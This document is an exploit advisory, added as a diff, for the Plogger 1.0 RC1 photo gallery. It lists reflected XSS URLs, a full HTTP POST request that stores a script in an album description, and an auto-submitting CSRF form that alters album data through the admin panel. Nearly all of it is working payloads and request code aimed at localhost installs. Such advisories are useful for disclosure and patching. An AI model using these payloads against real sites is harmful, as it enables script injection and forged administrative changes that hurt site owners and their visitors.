@@ -1,0 +1,61 @@
+# Exploit Title: Multiply vulnerabilites in plogger 1.0 (RC1)
+# Date: 03/02/2014
+# Exploit Author: killall-9@mail.com
+# Vendor Homepage: http://www.plogger.org/
+# Software Link: http://www.plogger.org/download/
+# Version: 1.0 (RC1)
+# Tested on: Virtualbox (debian) and Apache
+REFLECTED XSS:
+
+1) http://localhost/plogger-1.0RC1/?jump-menu=%22%20onmouseover%3dprompt%281337%29%20bad%3d%22
+2) http://localhost/plogger-1.0RC1/plog-admin/index.php?loginerror&r=%22%20onmouseover%3dprompt%281337%29%20bad%3d%22
+
+------------------------------------------------------
+
+STORED XSS: (must be logged in)
+
+1)
+
+POST /plogger-1.0RC1/plog-admin/plog-manage.php?level=albums&id=1 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/plogger-1.0RC1/plog-admin/plog-manage.php?action=edit-album&id=1
+Cookie: PHPSESSID=sjjl1sqlt8ceuo5upt6p9jfsf1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+
+name=Plogger%2BTest%2BAlbum&description=%3Cscript%3Ealert%28%22css+here%22%29%3B%3C%2Fscript%3E&thumbnail_id=4&pid=1&action=update-album&update=Update
+
+(In the description field it's possible to store javascript code)
+
+------------------------------------------------------
+
+CSRF:
+
+1)
+
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN'>
+<html lang="en">
+<head>
+<title>Pinata-CSRF-Tool</title>
+</head>
+<body>
+<form action="http://localhost/plogger-1.0RC1/plog-admin/plog-manage.php?level=albums&id=1" id="formid" method="post">
+<input name="name" value="Plogger+Test+Album" />
+<input name="description" value="Feel+free+to+ownz+it+" />
+<input name="thumbnail_id" value="0" />
+<input name="pid" value="1" />
+<input name="action" value="update-album" />
+<input name="update" value="Update" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
+
+chherZ.
